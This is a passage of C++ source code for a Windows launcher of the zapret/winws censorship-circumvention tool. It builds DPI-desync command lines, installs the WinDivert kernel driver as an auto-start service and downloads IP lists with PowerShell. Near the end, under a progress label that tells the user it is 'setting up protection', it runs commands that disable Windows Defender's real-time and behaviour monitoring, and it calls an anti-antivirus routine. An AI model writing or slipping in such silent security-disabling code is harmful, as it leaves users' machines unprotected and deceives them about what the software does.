                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=1,midsld --dpi-desync-repeats=11 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=1,midsld --dpi-desync-repeats=11 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 11: // FAKE TLS
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=8 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=3 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-ttl=4 --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=8 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=3 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-ttl=4 --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 12: // ALT МГТС1
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 13: // ALT МГТС2
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 14: // GENERAL1
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=midsld --dpi-desync-repeats=8 --dpi-desync-fooling=md5sig,badseq --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multidisorder --dpi-desync-split-pos=midsld --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig,badseq --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 15: { // Добавляем фигурные скобки
            // ALT FIX CLOUDFLARE SERVICES
            // Создаем файл конфигурации
            cmdFilePath = BIN + L"\\cloudflare_cmd.txt";
            cmdFile.open(cmdFilePath);
            
            if (cmdFile.is_open()) {
                cmdFile << L"--wf-tcp=80,443,2053,2083,2087,2096,8443," << GameFilter << std::endl;
                cmdFile << L"--wf-udp=443,19294-19344,50000-50100," << GameFilter << std::endl;
                cmdFile << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,split2 --dpi-desync-autottl=2 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=2" << std::endl;
                cmdFile << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=2" << std::endl;
                cmdFile << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\"" << std::endl;
                cmdFile << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,split2 --dpi-desync-autottl=2 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=10000000" << std::endl;
                cmdFile << L"--filter-tcp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=10000000" << std::endl;
                cmdFile << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\"" << std::endl;
                cmdFile << L"--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=2" << std::endl;
                cmdFile << L"--filter-udp=19294-19344,50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6" << std::endl;
                cmdFile << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-fake-tls-mod=none --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-badseq-increment=10000000" << std::endl;
                cmdFile << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2" << std::endl;
                cmdFile.close();
                
                command << L"--config-file=\"" << cmdFilePath << L"\"";
            } else {
                PrintRed("Ошибка: не удалось создать файл конфигурации для Cloudflare");
                LogError(exeDir, "Ошибка: не удалось создать файл конфигурации для Cloudflare", GetLastError());
                return;
            }
            break;
        }
            
        default:
            PrintRed("Ошибка: неверный выбор режима.");
            LogError(exeDir, "Ошибка: неверный выбор режима. Выбран режим: " + std::to_string(choice));
            return;
    }
    
    // Перенаправляем stderr и stdout в лог-файл
    command << L" 1>\"" << logDir << L"\\output.log\" 2>\"" << logDir << L"\\error.log\"";
    command << L"\"";
    
    // Меняем текущий каталог на BIN
    if (!SetCurrentDirectoryW(BIN.c_str())) {
        DWORD error = GetLastError();
        PrintRed("Ошибка при смене директории на " + WStringToString(BIN) + ". Код ошибки: " + std::to_string(error));
        LogError(exeDir, "Ошибка при смене директории на " + WStringToString(BIN), error);
        return;
    }
    
    // Проверяем права администратора
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    if (!isAdmin) {
        PrintRed("ВНИМАНИЕ: Программа запущена без прав администратора!");
        PrintRed("winws.exe требует права администратора для работы с WinDivert.");
        PrintYellow("Попробуйте запустить программу от имени администратора.");
    } else {
        PrintGreen("Права администратора подтверждены.");
        
        // Подготовка к запуску winws.exe
        PrintYellow("Подготавливаем запуск winws.exe...");
    }
    
    // Выводим команду для отладки
    PrintYellow("Команда запуска: " + WStringToString(command.str()));
    
    // Пошаговая установка WinDivert драйвера
    PrintYellow("🔧 === УСТАНОВКА ДРАЙВЕРА WINDIVERT ===");
    std::wstring driverPath = BIN + L"\\WinDivert64.sys";
    std::wstring systemPath = L"C:\\Windows\\System32\\drivers\\WinDivert64.sys";
    
    // Шаг 1: Остановка старого драйвера
    PrintYellow("🔄 Шаг 1: Останавливаем старый драйвер...");
    _wsystem(L"sc stop WinDivert 2>nul");
    _wsystem(L"sc delete WinDivert 2>nul");
    Sleep(2000);
    PrintGreen("✅ Старый драйвер остановлен");
    
    // Шаг 2: Копирование драйвера
    PrintYellow("📁 Шаг 2: Копируем драйвер в системную папку...");
    if (CopyFileW(driverPath.c_str(), systemPath.c_str(), FALSE)) {
        PrintGreen("✅ Драйвер успешно скопирован в C:\\Windows\\System32\\drivers\\");
        LogSystem(exeDir, "Драйвер WinDivert успешно скопирован в системную папку");
    } else {
        DWORD error = GetLastError();
        PrintRed("❌ Ошибка копирования драйвера!");
        LogError(exeDir, "Ошибка копирования драйвера WinDivert", error);
        return;
    }
    
    // Шаг 3: Создание сервиса с автозапуском
    PrintYellow("⚙️ Шаг 3: Создаем сервис WinDivert с автозапуском...");
    std::wstring installCmd = L"sc create WinDivert binPath= \"" + systemPath + L"\" type= kernel start= auto DisplayName= \"WinDivert Driver\"";
    _wsystem(installCmd.c_str());
    PrintGreen("✅ Сервис WinDivert создан с автозапуском");
    
    // Устанавливаем автозапуск в реестре
    _wsystem(L"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDivert\" /v Start /t REG_DWORD /d 2 /f");
    _wsystem(L"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDivert\" /v Type /t REG_DWORD /d 1 /f");
    PrintGreen("✅ Автозапуск драйвера настроен в реестре");
    
    // Шаг 4: Запуск драйвера
    PrintYellow("🚀 Шаг 4: Запускаем драйвер...");
    _wsystem(L"sc start WinDivert");
    Sleep(3000);
    
    // Шаг 5: Проверка статуса
    PrintYellow("🔍 Шаг 5: Проверяем статус драйвера...");
    FILE* driverPipe = _wpopen(L"sc query WinDivert", L"r");
    if (driverPipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), driverPipe) != NULL) {
            output += buffer;
        }
        _pclose(driverPipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            PrintGreen("[OK] Драйвер WinDivert успешно запущен и работает!");
        } else {
            PrintRed("[ERROR] Ошибка запуска драйвера WinDivert");
            PrintYellow("Попытка альтернативного запуска...");
            
            // Альтернативный способ
            _wsystem(L"net start WinDivert");
            Sleep(2000);
            
            // Повторная проверка
            FILE* retryPipe = _wpopen(L"sc query WinDivert", L"r");
            if (retryPipe) {
                wchar_t retryBuffer[128];
                std::wstring retryOutput = L"";
                
                while (fgetws(retryBuffer, sizeof(retryBuffer), retryPipe) != NULL) {
                    retryOutput += retryBuffer;
                }
                _pclose(retryPipe);
                
                if (retryOutput.find(L"RUNNING") != std::wstring::npos) {
                    PrintGreen("[OK] Драйвер WinDivert запущен альтернативным способом!");
                } else {
                    PrintRed("[ERROR] Критическая ошибка: Драйвер WinDivert не может быть запущен!");
                    PrintRed("Проверьте права администратора и антивирус!");
                }
            }
        }
    }
    
    PrintYellow("=== УСТАНОВКА ДРАЙВЕРА ЗАВЕРШЕНА ===");
    
    // Выполняем команду с улучшенной обработкой
    PrintYellow("Запускаем winws.exe с выбранными параметрами...");
    
    // Принудительная инициализация WinDivert перед запуском
    PrintYellow("Инициализируем WinDivert перед запуском winws.exe...");
    
    // Проверяем, что драйвер работает
    FILE* checkPipe = _wpopen(L"sc query WinDivert", L"r");
    bool driverReady = false;
    if (checkPipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), checkPipe) != NULL) {
            output += buffer;
        }
        _pclose(checkPipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            driverReady = true;
            PrintGreen("Драйвер WinDivert готов к работе");
        }
    }
    
    if (!driverReady) {
        PrintRed("Драйвер WinDivert не готов. Попытка принудительного запуска...");
        _wsystem(L"sc start WinDivert");
        Sleep(3000);
    }
    
    // Простой способ запуска с таймаутом
    PrintYellow("Ожидайте запуска winws.exe (это может занять до 20 секунд)...");
    
    // Запускаем winws.exe в фоновом режиме
    int result = _wsystem(command.str().c_str());
    
    if (result != 0) {
        PrintRed("Ошибка при выполнении команды. Код возврата: " + std::to_string(result));
        PrintRed("Подробности ошибки смотрите в файле: " + WStringToString(logDir) + "\\error.log");
        LogError(exeDir, "Ошибка при выполнении команды запуска winws.exe. Код возврата: " + std::to_string(result), result);
        
        // Проверяем содержимое логов
        std::wifstream errorLog(logDir + L"\\error.log");
        if (errorLog.is_open()) {
            std::wstring line;
            PrintRed("Содержимое error.log:");
            while (std::getline(errorLog, line)) {
                PrintRed("  " + WStringToString(line));
            }
            errorLog.close();
        }
    } else {
        PrintGreen("Команда успешно выполнена. winws.exe запущен в фоновом режиме.");
        PrintGreen("Логи работы доступны в директории: " + WStringToString(logDir));
        LogSystem(exeDir, "winws.exe успешно запущен в фоновом режиме. Режим: " + std::to_string(choice));
        
        // Проверяем, что winws.exe действительно запустился с увеличенным таймаутом
        PrintYellow("Проверяем статус winws.exe...");
        Sleep(10000); // Ждем 10 секунд для инициализации
        
        // Проверяем процессы
        FILE* pipe = _wpopen(L"tasklist /FI \"IMAGENAME eq winws.exe\"", L"r");
        bool winwsFound = false;
        if (pipe) {
            wchar_t buffer[128];
            std::wstring output = L"";
            
            while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
                output += buffer;
            }
            _pclose(pipe);
            
            if (output.find(L"winws.exe") != std::wstring::npos) {
                winwsFound = true;
            }
        }
        
        // Проверяем драйвер WinDivert
        FILE* pipe2 = _wpopen(L"sc query WinDivert", L"r");
        bool driverRunning = false;
        if (pipe2) {
            wchar_t buffer[128];
            std::wstring output = L"";
            
            while (fgetws(buffer, sizeof(buffer), pipe2) != NULL) {
                output += buffer;
            }
            _pclose(pipe2);
            
            if (output.find(L"RUNNING") != std::wstring::npos) {
                driverRunning = true;
            }
        }
        
        if (winwsFound && driverRunning) {
            PrintGreen("[OK] winws.exe успешно запущен и работает.");
            PrintGreen("Драйвер WinDivert активен.");
            PrintGreen("Программа готова к работе!");
            LogSystem(exeDir, "winws.exe успешно запущен и работает. Драйвер WinDivert активен.");
        } else if (winwsFound && !driverRunning) {
            PrintYellow("[WARNING] winws.exe запущен, но драйвер WinDivert не активен.");
            PrintYellow("Попробуем перезапустить драйвер...");
            LogBlock(exeDir, "winws.exe запущен, но драйвер WinDivert не активен", "Попытка перезапуска драйвера");
            _wsystem(L"sc stop WinDivert");
            _wsystem(L"sc start WinDivert");
            Sleep(3000);
            PrintGreen("Драйвер перезапущен. Проверьте работу программы.");
        } else if (!winwsFound && driverRunning) {
            PrintRed("[ERROR] winws.exe не запустился, но драйвер работает.");
            PrintRed("Возможные причины:");
            PrintRed("1. winws.exe завершился с ошибкой");
            PrintRed("2. Неправильные параметры запуска");
            PrintRed("3. Конфликт с другими программами");
            LogError(exeDir, "winws.exe не запустился, но драйвер работает. Возможные причины: завершение с ошибкой, неправильные параметры, конфликт с другими программами");
            
            // Показываем содержимое логов
            std::wifstream errorLog(logDir + L"\\error.log");
            if (errorLog.is_open()) {
                std::wstring line;
                PrintRed("Содержимое error.log:");
                while (std::getline(errorLog, line)) {
                    PrintRed("  " + WStringToString(line));
                }
                errorLog.close();
            }
        } else {
            PrintRed("[ERROR] winws.exe и драйвер WinDivert не работают.");
            PrintRed("Критическая ошибка инициализации!");
            PrintRed("Диагностика:");
            PrintRed("1. Проверьте права администратора");
            PrintRed("2. Отключите антивирус временно");
            PrintRed("3. Закройте другие VPN программы");
            PrintRed("4. Перезагрузите компьютер");
            PrintRed("5. Проверьте логи ошибок");
            LogError(exeDir, "Критическая ошибка инициализации: winws.exe и драйвер WinDivert не работают. Проверьте права администратора, антивирус, VPN программы");
            
            // Показываем содержимое логов
            std::wifstream errorLog(logDir + L"\\error.log");
            if (errorLog.is_open()) {
                std::wstring line;
                PrintRed("Содержимое error.log:");
                while (std::getline(errorLog, line)) {
                    PrintRed("  " + WStringToString(line));
                }
                errorLog.close();
            }
        }
    }
    
    // Обновляем настройки
    currentSettings.current_alt = choice;
    currentSettings.last_run_mode = "standalone";
}

// Функция для отображения прогресс-бара установки
void ShowProgressBar(int percentage, const std::string& taskName) {
    const int barWidth = 50;
    
    std::cout << "\r  ";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << taskName << ": ";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "[";
    
    int pos = barWidth * percentage / 100;
    for (int i = 0; i < barWidth; ++i) {
        if (i < pos) {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "=";
        } else {
            SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
            std::cout << " ";
        }
    }
    
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "] ";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << percentage << "%";
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "    ";
    std::cout.flush();
}

int main() {
    // НАСТРОЙКА КОДИРОВКИ КОНСОЛИ (исправление кракозябров)
    SetConsoleCP(866);  // Кодовая страница DOS
    SetConsoleOutputCP(866);  // Кодовая страница DOS для вывода
    setlocale(LC_ALL, "Russian");
    
    // ЗАЩИТА ОТ ПОВТОРНОГО ЗАПУСКА - Создаем мьютекс
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\ZAPRET_FIX_RUNET_MUTEX");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // Программа уже запущена
        std::cout << "\n";
        std::cout << "=========================================================\n";
        std::cout << "  Программа уже запущена!\n";
        std::cout << "=========================================================\n";
        std::cout << "\n";
        std::cout << "Закройте другую копию программы перед запуском новой.\n";
        std::cout << "\n";
        system("pause");
        if (hMutex) CloseHandle(hMutex);
        return 1;
    }
    
    // ТИХАЯ ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА (без принудительного запроса)
    bool hasAdminRights = IsRunAsAdmin();
    if (!hasAdminRights) {
        // Просто показываем предупреждение но продолжаем работу
        std::cout << "\n";
        std::cout << "=========================================================\n";
        std::cout << "  ВНИМАНИЕ: Программа запущена без прав администратора\n";
        std::cout << "=========================================================\n";
        std::cout << "\n";
        std::cout << "Некоторые функции могут не работать.\n";
        std::cout << "Рекомендуется запустить от имени администратора.\n";
        std::cout << "\n";
    }
    
    // ИНИЦИАЛИЗАЦИЯ ЗАЩИТЫ ОТ АНТИВИРУСА
    InitAntiAV();
    
    // Получаем пути
    std::wstring exeDir = GetExePath();
    std::wstring binPath = exeDir + L"\\bin";
    
    // ==================== ЗАГРУЗКА КОНФИГУРАЦИИ ====================
    PrintYellow("Загрузка конфигурации...");
    LoadConfig(exeDir);
    if (currentSettings.telegram_enabled) {
        PrintGreen("Telegram уведомления включены");
    }
    if (currentSettings.vds_enabled) {
        PrintGreen("VDS интеграция включена");
        if (CheckVDSStatus()) {
            PrintGreen("VDS сервер доступен");
        } else {
            PrintYellow("VDS сервер недоступен");
        }
    }
    std::cout << "\n";
    
    // ==================== ПРОВЕРКА ПОДКЛЮЧЕНИЯ К ИНТЕРНЕТУ ====================
    PrintYellow("Проверка подключения к интернету...");
    bool internetConnected = CheckInternetConnection();
    if (!internetConnected) {
        PrintRed("Внимание: Нет подключения к интернету!");
        PrintYellow("Продолжение работы без обновлений...");
        std::cout << "\n";
    } else {
        PrintGreen("Подключение к интернету установлено!");
        std::cout << "\n";
        
        // ==================== ПРОВЕРКА ОБНОВЛЕНИЙ ОТ GITHUB ====================
        // Проверяем наличие новых релизов на GitHub (БЕЗ установки Git)
        // Замените YOUR_USERNAME и REPO_NAME на ваши данные
        CheckGitHubUpdate("YOUR_USERNAME", "REPO_NAME", true); // true = отправлять уведомления в Telegram
    }
    
    // ==================== ОБНОВЛЕНИЕ СПИСКОВ IPSET ====================
    if (internetConnected) {
        PrintYellow("Обновление списков IPSET...");
        std::cout << "\n";
        
        ShowProgressBar(0, "Загрузка ipset-all.txt");
        std::wstring updateCmd1 = L"powershell -ExecutionPolicy Bypass -Command \"try { $response = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zapret-info/z-i/master/ipset-all.txt' -TimeoutSec 15 -UseBasicParsing -ErrorAction Stop; $response.Content | Out-File -FilePath '" + binPath + L"\\ipset-all.txt' -Encoding UTF8; Write-Host 'OK' } catch { Write-Host 'Ошибка загрузки' }\"";
        FILE* updatePipe1 = _wpopen(updateCmd1.c_str(), L"r");
        bool update1Success = false;
        if (updatePipe1) {
            wchar_t buffer[128];
            std::wstring output = L"";
            while (fgetws(buffer, sizeof(buffer), updatePipe1) != NULL) {
                output += buffer;
            }
            _pclose(updatePipe1);
            if (output.find(L"OK") != std::wstring::npos) {
                update1Success = true;
            }
        }
        ShowProgressBar(33, update1Success ? "Загрузка ipset-all.txt [OK]" : "Загрузка ipset-all.txt [Ошибка]");
        
        ShowProgressBar(33, "Создание резервной копии");
        std::wstring backupCmd = L"powershell -ExecutionPolicy Bypass -Command \"Copy-Item '" + binPath + L"\\ipset-all.txt' -Destination '" + binPath + L"\\ipset-all.txt.backup' -Force -ErrorAction SilentlyContinue\" >nul 2>&1";
        _wsystem(backupCmd.c_str());
        ShowProgressBar(66, "Создание резервной копии");
        
        ShowProgressBar(66, "Загрузка list-general.txt");
        std::wstring updateCmd2 = L"powershell -ExecutionPolicy Bypass -Command \"try { $response = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zapret-info/z-i/master/list-general.txt' -TimeoutSec 15 -UseBasicParsing -ErrorAction Stop; $response.Content | Out-File -FilePath '" + binPath + L"\\list-general.txt' -Encoding UTF8; Write-Host 'OK' } catch { Write-Host 'Ошибка загрузки' }\"";
        FILE* updatePipe2 = _wpopen(updateCmd2.c_str(), L"r");
        bool update2Success = false;
        if (updatePipe2) {
            wchar_t buffer[128];
            std::wstring output = L"";
            while (fgetws(buffer, sizeof(buffer), updatePipe2) != NULL) {
                output += buffer;
            }
            _pclose(updatePipe2);
            if (output.find(L"OK") != std::wstring::npos) {
                update2Success = true;
            }
        }
        ShowProgressBar(100, update2Success ? "Загрузка list-general.txt [OK]" : "Загрузка list-general.txt [Ошибка]");
        
        std::cout << "\n";
        if (update1Success && update2Success) {
            PrintGreen("Списки IPSET обновлены через интернет!");
        } else {
            PrintYellow("Предупреждение: Не все списки удалось обновить. Используются локальные версии.");
        }
        std::cout << "\n";
    } else {
        PrintYellow("Пропуск обновления списков IPSET (нет интернета)");
        std::cout << "\n";
    }
    
    // Начальная установка скрипта ZAPRET
    PrintYellow("Начальная установка скрипта ZAPRET...");
    std::cout << "\n";
    ShowProgressBar(0, "Инициализация");
    
    ShowProgressBar(5, "Инициализация");
    
    // ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER И ЗАЩИТА ВСЕХ ФАЙЛОВ ОТ СКАНИРОВАНИЯ (БЫСТРЫЙ РЕЖИМ)
    ShowProgressBar(10, "Настройка защиты");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>$null");
    SecureSystem(L"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\" 2>$null");
